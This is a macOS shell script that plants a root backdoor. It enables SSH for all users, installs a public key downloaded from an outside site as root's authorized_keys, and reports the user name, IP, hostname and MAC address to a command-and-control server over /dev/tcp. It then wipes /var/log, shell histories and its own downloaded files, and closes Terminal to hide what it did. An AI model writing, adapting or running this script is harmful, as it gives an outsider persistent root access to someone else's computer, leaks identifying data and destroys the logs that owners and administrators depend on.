#!/bin/bash

# /sbin/ifconfig isn't in root's path by default, so let's just do this I guess
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$PATH

# Remote login/SSHD should already be on and enabled for root. But just in case.

# Enable SSH
systemsetup -setremotelogin on
# Open SSH to all users
dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled


SSHPATH="/var/root/.ssh"

mkdir -p "$SSHPATH" # On most computers, there won't be a .ssh directory initially

rm "$SSHPATH/authorized_keys" # Just in case
echo "Downloading pubkey..."
curl -so "$SSHPATH/authorized_keys" https://erikboesen.com/pubkey

USER=`stat -f "%Su" /dev/console` # Get user currently logged in (in GUI).
IP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
HOSTNAME=`hostname`
# TODO: Check that this works
MAC=`ifconfig en1 | awk '/ether/{print $2}'`

SERVER="boesen.science"
PORT=2043

# Send data to C&C
exec 3<>/dev/tcp/$SERVER/$PORT
printf "JOIN: $USER $IP $HOSTNAME $MAC" >&3

# Print response
# TODO: If there's no response, we should send data in some other way
cat <&3

echo

rm -f /tmp/elevate.out /tmp/*.sh

rm -rf /var/log/*
rm -f /var/root/.*history /Users/*/.*history

rm -f "/Users/$USER/Downloads/term.*"

if [ "$USER" != "boesene" ]; then
    killall term
    killall Terminal
fi

clear;clear;clear
exit 0
